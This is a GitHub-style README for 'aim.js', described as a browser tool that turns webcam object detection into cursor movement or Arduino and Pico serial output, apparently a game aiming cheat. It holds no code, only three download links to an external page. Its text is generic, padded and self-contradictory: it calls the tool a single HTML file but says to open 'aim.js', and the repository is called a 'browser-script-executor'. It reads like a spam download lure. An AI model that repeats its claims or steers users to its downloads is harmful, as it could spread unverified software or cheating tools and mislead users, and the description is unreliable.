# aim.js v2026 - Game Script Utility 2026

> **A browser-first object detection tool with cursor automation for web workflows.** aim.js reads webcam input locally in the browser, identifies objects on the client side, and can translate that into cursor movement or serial output for micro-controller-based setups.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielbennettlhk303/aimjs-browser-script-executor?style=flat-square)](https://github.com/danielbennettlhk303/aimjs-browser-script-executor)

---

<p align="center">
  <a href="https://danielbennettlhk303.github.io/aimjs-browser-script-executor/">
    <img src="https://img.shields.io/badge/Download-aim.js%20Script-brightgreen?style=for-the-badge" alt="Download aim.js Script">
  </a>
</p>

> **[Direct Download - aim.js](https://danielbennettlhk303.github.io/aimjs-browser-script-executor/)**

---

[Download Latest Build](https://danielbennettlhk303.github.io/aimjs-browser-script-executor/)

---

## What it does

aim.js is a compact browser utility centered on live webcam analysis. Its purpose is to turn visual detection into usable cursor control and device output without pushing frames to a remote service. Everything runs in the browser, with the full experience contained in a single HTML file that includes its JavaScript.

It is built for automation-style browser use cases where object location, movement smoothing, and detection thresholds need to be adjusted. The project also supports serial output for micro-controller workflows such as Arduino and Raspberry Pi Pico, so browser detection can be paired with external hardware.

---

## Core features

- Real-time object detection from the webcam inside the browser
- Cursor motion based on where the detected object appears
- Serial output support for Arduino and Raspberry Pi Pico
- Client-side operation with no cloud processing required
- Distributed as one HTML file with embedded JavaScript
- Adjustable detection threshold for response tuning
- Smoothing controls to refine movement behavior
- Overlay options for on-screen visual feedback

---

## Getting started

1. Download the latest build from the project page.
2. Open the single HTML file in a modern web browser.
3. Approve webcam access when the browser asks.
4. Configure the detection and overlay controls to suit your workflow.
5. If you plan to use micro-controller output, connect the supported board and set up the serial path before you begin.

Minimal example:
- Open `aim.js` in your browser
- Grant camera permission
- Enable the control mode you want to use
- Fine-tune threshold and smoothing until the detection behavior fits your setup

---

## Configuration

| Setting | Purpose |
| --- | --- |
| Detection threshold | Controls how confident detection must be before output is triggered |
| Smoothing | Softens cursor movement and reduces abrupt changes |
| Overlay | Shows visual detection feedback in the browser |
| Cursor control | Sends movement based on detected object location |
| Serial output | Sends data to supported micro-controller connections |

Common workflow example:

- Lower the threshold if detection feels too strict
- Increase smoothing if movement is too sharp
- Disable the overlay if you want a cleaner view
- Enable serial output when working with Arduino or Raspberry Pi Pico

---

## Compatibility and requirements

aim.js is intended for use in a web browser with webcam access enabled. Since it ships as a single HTML file, the main requirement is a browser that supports modern JavaScript plus camera permissions.

Supported workflows include:
- Browser-based webcam analysis
- Cursor automation in supported browser environments
- Serial output for compatible micro-controller integrations

Known limitations:
- Requires camera permission to function
- Depends on browser support for local webcam handling and related APIs
- Hardware output depends on your serial setup and connected device configuration

---

## FAQ

### How do I get started?
Open the HTML file in your browser, allow webcam access, and try the default settings before changing any controls.

### Can the detection behavior be adjusted?
Yes. Threshold, smoothing, and overlay settings are provided so you can tune how detection and movement respond.

### Does it require an internet connection?
No. Processing stays on the client and works offline, so normal use does not depend on cloud services.

### Can it connect to external hardware?
Yes. The project includes serial-oriented output support for Arduino and Raspberry Pi Pico.

### What is included in the project?
The project comes as a single HTML file with embedded JavaScript.

### How do I update to a newer version?
Download the latest build from the project page and replace your current copy with the new file.

### Is it tied to a specific browser?
It is meant for browsers that support webcam access and the necessary JavaScript features. Results may differ between browsers.

### Can custom settings persist?
If your browser environment keeps local state, settings may remain between sessions. That depends on browser storage support and how the file is opened.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
